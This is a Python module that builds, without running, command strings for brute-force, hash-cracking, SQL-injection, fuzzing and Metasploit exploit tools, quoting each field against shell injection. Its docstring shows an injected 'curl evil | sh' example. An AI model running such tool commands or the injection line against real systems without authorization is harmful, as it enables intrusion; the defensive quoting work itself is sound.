"""Command builder for the aggressive tools (brute force / exploit / DoS-capable).

This module never runs anything. It has no dependency on common.run_tool or
subprocess — that's structural, not just a convention, so there's no code
path here that could ever execute a command. It only assembles a string for
Cole to read, review, and paste into his own terminal.

Every field value is passed through shlex.quote before being placed in the
string. That's not for our safety (nothing here executes) — it's so a
malicious or malformed field can't turn into a second shell command when
Cole pastes the output into a real terminal (e.g. a wordlist "path" of
`x; curl evil | sh` renders as a single quoted, inert argument).
"""

from __future__ import annotations

import shlex

MAX_FIELD_LEN = 2048


def _clean(v) -> str:
    s = "" if v is None else str(v)
    s = s.replace("\n", " ").replace("\r", " ").strip()
    return s[:MAX_FIELD_LEN]


def _q(v) -> str:
    return shlex.quote(_clean(v))


def _cmd(parts: list[str]) -> str:
    return " ".join(p for p in parts if p)


# --------------------------------------------------------------------------
# Each builder: (params dict) -> assembled command string. `required` lists
# the keys that must be non-empty for the template to make sense; missing
# ones are left as a <PLACEHOLDER> in the output rather than failing, so
# Cole can see the shape of the command even with a partial form.
# --------------------------------------------------------------------------
def _ph(params: dict, key: str, label: str) -> str:
    v = params.get(key)
    if v is None or _clean(v) == "":
        return f"<{label}>"
    return _q(v)


def _build_hydra(p: dict) -> str:
    login_flag = "-L" if p.get("login_is_file") else "-l"
    pass_flag = "-P" if p.get("pass_is_file") else "-p"
    tasks = _clean(p.get("tasks")) or "4"
    parts = [
        "hydra",
        login_flag, _ph(p, "login", "USERNAME_OR_USERFILE"),
        pass_flag, _ph(p, "password", "PASSWORD_OR_PASSFILE"),
        "-t", shlex.quote(tasks),
        _ph(p, "target", "TARGET"),
        _ph(p, "service", "SERVICE"),
    ]
    return _cmd(parts)


def _build_hashcat(p: dict) -> str:
    mode = _clean(p.get("mode")) or "<HASH_MODE>"
    attack = _clean(p.get("attack")) or "0"
    parts = [
        "hashcat", "-m", shlex.quote(mode), "-a", shlex.quote(attack),
        _ph(p, "hash_file", "HASH_FILE"),
        _ph(p, "wordlist_or_mask", "WORDLIST_OR_MASK"),
    ]
    return _cmd(parts)


def _build_sqlmap(p: dict) -> str:
    parts = ["sqlmap", "-u", _ph(p, "url", "URL")]
    if _clean(p.get("data")):
        parts += ["--data", _q(p["data"])]
    if _clean(p.get("cookie")):
        parts += ["--cookie", _q(p["cookie"])]
    parts += ["--level", shlex.quote(_clean(p.get("level")) or "1")]
    parts += ["--risk", shlex.quote(_clean(p.get("risk")) or "1")]
    parts.append("--batch")
    return _cmd(parts)


def _build_metasploit(p: dict) -> str:
    module = _clean(p.get("module")) or "<MODULE e.g. exploit/windows/smb/ms17_010_eternalblue>"
    lines = [f"use {module}"]
    if _clean(p.get("rhosts")):
        lines.append(f"set RHOSTS {_clean(p['rhosts'])}")
    if _clean(p.get("rport")):
        lines.append(f"set RPORT {_clean(p['rport'])}")
    if _clean(p.get("payload")):
        lines.append(f"set PAYLOAD {_clean(p['payload'])}")
    if _clean(p.get("lhost")):
        lines.append(f"set LHOST {_clean(p['lhost'])}")
    lines.append("run")
    resource = "; ".join(lines)
    return _cmd(["msfconsole", "-q", "-x", shlex.quote(resource)])


def _build_medusa(p: dict) -> str:
    user_flag = "-U" if p.get("login_is_file") else "-u"
    pass_flag = "-P" if p.get("pass_is_file") else "-p"
    tasks = _clean(p.get("tasks")) or "4"
    parts = [
        "medusa", "-h", _ph(p, "target", "TARGET"),
        user_flag, _ph(p, "login", "USERNAME_OR_USERFILE"),
        pass_flag, _ph(p, "password", "PASSWORD_OR_PASSFILE"),
        "-M", _ph(p, "service", "MODULE"),
        "-t", shlex.quote(tasks),
    ]
    return _cmd(parts)


def _build_john(p: dict) -> str:
    parts = ["john"]
    if _clean(p.get("format")):
        parts.append(f"--format={_clean(p['format'])}")
    if _clean(p.get("wordlist")):
        parts.append(f"--wordlist={_q(p['wordlist'])}")
    parts.append(_ph(p, "hash_file", "HASH_FILE"))
    return _cmd(parts)


def _build_ffuf(p: dict) -> str:
    parts = ["ffuf", "-u", _ph(p, "url", "URL_WITH_FUZZ_KEYWORD")]
    parts += ["-w", _ph(p, "wordlist", "WORDLIST")]
    if _clean(p.get("filter_code")):
        parts += ["-fc", shlex.quote(_clean(p["filter_code"]))]
    parts += ["-t", shlex.quote(_clean(p.get("threads")) or "40")]
    return _cmd(parts)


def _build_gobuster(p: dict) -> str:
    mode = _clean(p.get("mode")) or "dir"
    parts = ["gobuster", shlex.quote(mode), "-u", _ph(p, "target", "URL_OR_DOMAIN")]
    parts += ["-w", _ph(p, "wordlist", "WORDLIST")]
    if mode == "dir" and _clean(p.get("extensions")):
        parts += ["-x", shlex.quote(_clean(p["extensions"]))]
    parts += ["-t", shlex.quote(_clean(p.get("threads")) or "10")]
    return _cmd(parts)


def _build_wpscan(p: dict) -> str:
    parts = ["wpscan", "--url", _ph(p, "url", "URL")]
    parts += ["--enumerate", shlex.quote(_clean(p.get("enumerate")) or "vp,vt,u")]
    if _clean(p.get("api_token")):
        parts += ["--api-token", _q(p["api_token"])]
    parts.append("--random-user-agent")
    return _cmd(parts)


def _build_commix(p: dict) -> str:
    parts = ["commix", f"--url={_ph(p, 'url', 'URL')}"]
    if _clean(p.get("data")):
        parts.append(f"--data={_q(p['data'])}")
    if _clean(p.get("cookie")):
        parts.append(f"--cookie={_q(p['cookie'])}")
    parts.append(f"--level={shlex.quote(_clean(p.get('level')) or '1')}")
    parts.append("--batch")
    return _cmd(parts)


BUILDERS = {
    "hydra": {"build": _build_hydra, "desc": "Online login brute-force (many protocols).",
              "fields": ["target", "service", "login", "login_is_file", "password", "pass_is_file", "tasks"]},
    "hashcat": {"build": _build_hashcat, "desc": "Offline hash cracking.",
                "fields": ["hash_file", "mode", "attack", "wordlist_or_mask"]},
    "sqlmap": {"build": _build_sqlmap, "desc": "Automated SQL injection testing.",
               "fields": ["url", "data", "cookie", "level", "risk"]},
    "metasploit": {"build": _build_metasploit, "desc": "Exploit module resource script (msfconsole -x).",
                   "fields": ["module", "rhosts", "rport", "payload", "lhost"]},
    "medusa": {"build": _build_medusa, "desc": "Parallel online login brute-force.",
               "fields": ["target", "service", "login", "login_is_file", "password", "pass_is_file", "tasks"]},
    "john": {"build": _build_john, "desc": "Offline password hash cracking.",
             "fields": ["hash_file", "format", "wordlist"]},
    "ffuf": {"build": _build_ffuf, "desc": "Fast web fuzzing / directory brute-force.",
             "fields": ["url", "wordlist", "filter_code", "threads"]},
    "gobuster": {"build": _build_gobuster, "desc": "Directory / DNS / vhost brute-force.",
                 "fields": ["mode", "target", "wordlist", "extensions", "threads"]},
    "wpscan": {"build": _build_wpscan, "desc": "Aggressive WordPress vuln + enumeration scan.",
               "fields": ["url", "enumerate", "api_token"]},
    "commix": {"build": _build_commix, "desc": "Automated command-injection exploitation.",
               "fields": ["url", "data", "cookie", "level"]},
}


def handle_build(req) -> "common.Response":
    from shared import common  # local import: keep this module import-clean of exec-capable code
    body = req.json()
    tool = str(body.get("tool") or "")
    params = body.get("params") or {}
    if not isinstance(params, dict):
        params = {}

    entry = BUILDERS.get(tool)
    if entry is None:
        return common.Response.error(400,
            f"'{tool}' has no command builder. Known: {', '.join(sorted(BUILDERS))}")

    command = entry["build"](params)
    return common.Response.json({
        "tool": tool,
        "command": command,
        "note": "This command is NOT executed. Copy it and run it yourself in a terminal.",
    })
